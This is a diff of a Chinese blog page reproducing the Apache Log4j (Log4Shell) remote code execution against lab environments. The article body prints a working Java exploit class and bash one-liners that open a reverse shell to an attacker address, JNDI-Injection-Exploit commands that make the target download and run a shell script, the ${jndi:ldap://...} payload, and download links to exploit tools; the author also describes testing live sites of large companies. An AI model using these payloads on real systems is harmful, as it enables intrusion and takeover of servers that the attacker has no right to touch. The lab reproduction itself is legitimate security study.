@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言原理分析在文章最后几个知名公众号里去看，分析的很好 开头一张图  正文根据网上公布的反弹 shell Exp 利用 更换一下exp中的 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#123;        try &amp;">
+    <meta name="description" content="前言原理分析在文章最后几个知名公众号里去看，分析的很好，开头一张图。  正文根据网上公布的reverse shell Exp 进行利用 更换一下exp中的 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#123;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Apache Log4j RCE简单复现">
 <meta property="og:url" content="http://example.com/posts/358775679/index.html">
 <meta property="og:site_name" content="Brich">
-<meta property="og:description" content="前言原理分析在文章最后几个知名公众号里去看，分析的很好 开头一张图  正文根据网上公布的反弹 shell Exp 利用 更换一下exp中的 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#123;        try &amp;">
+<meta property="og:description" content="前言原理分析在文章最后几个知名公众号里去看，分析的很好，开头一张图。  正文根据网上公布的reverse shell Exp 进行利用 更换一下exp中的 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#123;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg">
 <meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639205294/Xnip2021-12-11_14-46-44_vvmgih.png">
@@ -23,8 +23,18 @@
 <meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639206468/Xnip2021-12-11_15-07-30_polfii.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220323145740716.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220323150714759.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220323150948377.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220323150854328.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220323151214415.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg">
 <meta property="article:published_time" content="2021-12-11T10:56:58.000Z">
-<meta property="article:modified_time" content="2022-03-23T07:20:44.727Z">
+<meta property="article:modified_time" content="2022-03-23T07:33:16.831Z">
 <meta property="article:author" content="lin">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
@@ -123,7 +133,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">4.</span> <span class="toc-text">JNDI注入测试工具</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">4.</span> <span class="toc-text">JNDI注入测试工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell-1"><span class="toc-number">4.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%9D%B6%E5%9C%BA"><span class="toc-number">5.</span> <span class="toc-text">其他靶场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">相关工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Burp-%E6%8F%92%E4%BB%B6%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">Burp 插件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">6.2.</span> <span class="toc-text">利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E4%BA%86%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%B8%B8%E5%A7%BF%E5%8A%BF"><span class="toc-number">7.</span> <span class="toc-text">收集了一些正常姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baidu"><span class="toc-number">7.1.</span> <span class="toc-text">Baidu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apple"><span class="toc-number">7.2.</span> <span class="toc-text">Apple</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">参考文章：</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -167,10 +177,9 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原理分析在文章最后几个知名公众号里去看，分析的很好</p>
-<p>开头一张图</p>
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原理分析在文章最后几个知名公众号里去看，分析的很好，开头一张图。</p>
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>根据网上公布的反弹 shell Exp 利用</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>根据网上公布的reverse shell Exp 进行利用</p>
 <p>更换一下exp中的 ip 即可</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/12000 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -178,6 +187,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.class</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205294/Xnip2021-12-11_14-46-44_vvmgih.png"></p>
+<p>使用python启动一个简单的http服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 11000</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-42_qmn4m7.png"></p>
@@ -189,90 +199,63 @@
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205750/Xnip2021-12-11_14-55-30_xgwmx0.png"></p>
 <p>nc 监听 12000 端口</p>
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206251/Xnip2021-12-11_15-03-42_u7jimd.png"></p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>使用在线环境</p>
-<p><a target="_blank" rel="noopener" href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>使用在线漏洞环境：<a target="_blank" rel="noopener" href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p>
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206349/Xnip2021-12-11_15-05-38_de7hpo.png"></p>
 <h3 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h3><p>点击登录即可收到反弹的 shell</p>
 <p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206468/Xnip2021-12-11_15-07-30_polfii.png"></p>
-<h2 id="JNDI注入测试工具"><a href="#JNDI注入测试工具" class="headerlink" title="JNDI注入测试工具"></a>JNDI注入测试工具</h2><p>作者github地址：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<h2 id="JNDI注入测试工具"><a href="#JNDI注入测试工具" class="headerlink" title="JNDI注入测试工具"></a>JNDI注入测试工具</h2><p>作者github：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
 <p>写一个反弹shell脚本，并使用python开启一个简单http服务以供目标下载</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/xxx.xxx.xxx.xxx/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>
 
-<p>使用JNDI-Injection-Exploit启动一个RMI服务器、LDAP服务器和HTTP服务器</p>
-<p>让目标下载反弹shell脚本</p>
+<p>使用JNDI-Injection-Exploit启动一个RMI服务器、LDAP服务器和HTTP服务器，并让目标下载上面制作的反弹shell的脚本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;curl http://xxx.xxx.xxx.xxx/reserve.sh -o r.sh&quot;</span> -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323145740716.png" alt="image-20220323145740716"></p>
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150714759.png" alt="image-20220323150714759"></p>
-<p>让目标执行反弹shell脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20220323150948377](https://typro-1304950244.file.myqcloud.com/image-20220323150948377.png)</span><br><span class="line"></span><br><span class="line">![image-20220323150854328](https://typro-1304950244.file.myqcloud.com/image-20220323150854328.png)</span><br><span class="line"></span><br><span class="line">### Reverse shell</span><br><span class="line"></span><br><span class="line">![image-20220323151214415](https://typro-1304950244.file.myqcloud.com/image-20220323151214415.png)</span><br><span class="line"></span><br><span class="line">## 其他靶场</span><br><span class="line"></span><br><span class="line">雷石安全实验室的靶场：https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;fengxuan&#x2F;log4j_vuln<br>docker run -it -d -p 8080:8080 –name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com&#x2F;fengxuan&#x2F;log4j_vuln<br>docker exec -it log4j_vuln_container &#x2F;bin&#x2F;bash<br>&#x2F;bin&#x2F;bash &#x2F;home&#x2F;apache-tomcat-8.5.45&#x2F;bin&#x2F;startup.sh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BUGKU：https://ctf.bugku.com/challenges/detail/id/340.html</span><br><span class="line"></span><br><span class="line">CTF Show、vulfoucs 等平台都有对应的漏洞 docker 环境</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 相关工具</span><br><span class="line"></span><br><span class="line">以下工具来源于网络，后门自测</span><br><span class="line"></span><br><span class="line">### burp 插件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>「Log4j2Scan-0.1-SNAPSHOT.jar」链接：<a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/tiCPNENwLkC">https://www.aliyundrive.com/s/tiCPNENwLkC</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 利用工具</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>「Log4j_RCE_Tool」链接：<a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/JL2DEh73pR2">https://www.aliyundrive.com/s/JL2DEh73pR2</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<p>「marshalsec-jar」链接：<a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/YGA3xFHndmm">https://www.aliyundrive.com/s/YGA3xFHndmm</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<p>「Apache-Log4j-Learning」链接：<a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/7S7sD3JgYwf">https://www.aliyundrive.com/s/7S7sD3JgYwf</a></p>
-<pre><code>
-log4j 被定义为 “核弹级漏洞”，这几天朋友圈、微信群、QQ 群全是 dnslog 图，包括一些大厂如苹果、京东、百度、拼多多等都存在漏洞风险，由于测试过于激烈，导致 dnslog 平台、fofa 平台一度崩溃、这几天更被称为安全圈的 “年会” ，刚才测试了几个站，发现就算 dnslog 有记录，也不一定能反弹 shell，dnslog 不等于任意代码执行。
+<p>让目标执行刚才下载的反弹shell的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash  r.sh&quot;</span> -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150948377.png" alt="image-20220323150948377"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150854328.png" alt="image-20220323150854328"></p>
+<h3 id="Reverse-shell-1"><a href="#Reverse-shell-1" class="headerlink" title="Reverse shell"></a>Reverse shell</h3><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323151214415.png" alt="image-20220323151214415"></p>
+<h2 id="其他靶场"><a href="#其他靶场" class="headerlink" title="其他靶场"></a>其他靶场</h2><p>雷石安全实验室的靶场：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ">https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln </span><br><span class="line">docker exec -it log4j_vuln_container /bin/bash</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br></pre></td></tr></table></figure>
 
+<p>BUGKU：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p>
+<p>CTF Show、vulfoucs 等平台都有对应的漏洞 Docker 环境</p>
+<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><blockquote>
+<p>以下工具来源于网络，本人能力有限，后门请自测！</p>
+</blockquote>
+<h3 id="Burp-插件："><a href="#Burp-插件：" class="headerlink" title="Burp 插件："></a>Burp 插件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j2Scan-0.1-SNAPSHOT.jar」链接：https://www.aliyundrive.com/s/tiCPNENwLkC</span><br></pre></td></tr></table></figure>
 
-![](https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg)
+<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j_RCE_Tool」链接：https://www.aliyundrive.com/s/JL2DEh73pR2</span><br></pre></td></tr></table></figure>
 
-收集了一些正常姿势
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「marshalsec-jar」链接：https://www.aliyundrive.com/s/YGA3xFHndmm</span><br></pre></td></tr></table></figure>
 
-baidu
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Apache-Log4j-Learning」链接：https://www.aliyundrive.com/s/7S7sD3JgYwf</span><br></pre></td></tr></table></figure>
 
-![](https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg)
-
-apple
-
-![](https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg)
-
-等等。。。。。。
-
-然后也看到了一些骚姿势
-
-比如 apple airpods 改名字之后。。。。。
-
-这个我证实确实有。。。。。
-
-
-![](https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg)
-
-甚至是 wifi （未测试）
-
-![](https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg)
-
-车。。。。（没有保时捷，未能测试呜呜呜呜呜呜）
-
-![](https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg)
-
-emm，windows。。挺离谱的，不过倒也正常
-
-![](https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg)
-
-还有对着地球喊了一声 $&#123;jndi:ldap://ip:6666/Exp&#125;，dnslog 就有记录了
-
-反正就是万物皆可 $&#123;jndi:ldap://ip:6666/Exp&#125;
-
-
-
-
-
-## 参考文章：
-
-https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg
-
-https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw
-
-https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ
-</code></pre>
+<p>log4j 被定义为 “核弹级漏洞”，这几天朋友圈、微信群、QQ 群全是 dnslog 图，包括一些大厂如苹果、京东、百度、拼多多等都存在漏洞风险，由于测试过于激烈，导致 dnslog 平台、fofa 平台一度崩溃、这几天更被称为安全圈的 “年会” ，刚才测试了几个站，发现就算 dnslog 有记录，也不一定能反弹 shell，dnslog 不等于任意代码执行。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg"></p>
+<h2 id="收集了一些正常姿势"><a href="#收集了一些正常姿势" class="headerlink" title="收集了一些正常姿势"></a>收集了一些正常姿势</h2><h3 id="Baidu"><a href="#Baidu" class="headerlink" title="Baidu"></a>Baidu</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg"></p>
+<h3 id="Apple"><a href="#Apple" class="headerlink" title="Apple"></a>Apple</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg"></p>
+<p>等等。。。。。。</p>
+<p>然后也看到了一些骚姿势</p>
+<p>比如 apple airpods 改名字之后。。。。。</p>
+<p>这个我证实确实有。。。。。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg"></p>
+<p>甚至是 wifi （未测试）</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg"></p>
+<p>车。。。。（没有保时捷，未能测试呜呜呜呜呜呜）</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg"></p>
+<p>emm，windows。。挺离谱的，不过倒也正常</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg"></p>
+<p>还有对着地球喊了一声 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}，dnslog 就有记录了</p>
+<p>反正就是万物皆可 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg">https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw">https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ">https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ</a></p>
 
   </div>
 </article>
@@ -307,7 +290,7 @@ https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">4.</span> <span class="toc-text">JNDI注入测试工具</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">4.</span> <span class="toc-text">JNDI注入测试工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-shell-1"><span class="toc-number">4.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%9D%B6%E5%9C%BA"><span class="toc-number">5.</span> <span class="toc-text">其他靶场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">相关工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Burp-%E6%8F%92%E4%BB%B6%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">Burp 插件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">6.2.</span> <span class="toc-text">利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E4%BA%86%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%B8%B8%E5%A7%BF%E5%8A%BF"><span class="toc-number">7.</span> <span class="toc-text">收集了一些正常姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baidu"><span class="toc-number">7.1.</span> <span class="toc-text">Baidu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apple"><span class="toc-number">7.2.</span> <span class="toc-text">Apple</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">参考文章：</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
